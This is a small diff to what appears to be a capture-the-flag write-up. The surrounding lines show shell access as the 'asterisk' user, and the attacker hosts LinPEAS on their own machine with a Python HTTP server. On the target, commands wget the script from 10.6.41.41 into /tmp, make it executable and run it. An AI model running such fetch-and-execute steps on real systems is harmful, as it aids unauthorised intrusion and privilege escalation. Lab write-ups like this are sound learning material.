@@ -39,7 +39,7 @@ id
 uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
 ``` 
 - Executed LinPEAS to get more info about the machine:
-1).``` python3 -m http.server 8000 ``` (opened new tab in the terminal and ran this command in LinPEAS directory)
+-> ``` python3 -m http.server 8000 ``` (opened new tab in the terminal and ran this command in LinPEAS directory)
 2). On the target machine I ran those 3 commands: ``` wget http://10.6.41.41:8000/linpeas.sh -O /tmp/linpeas.sh ```
 3). ``` chmod +x /tmp/linpeas.sh ```
 4). ``` /tmp/linpeas.sh ```
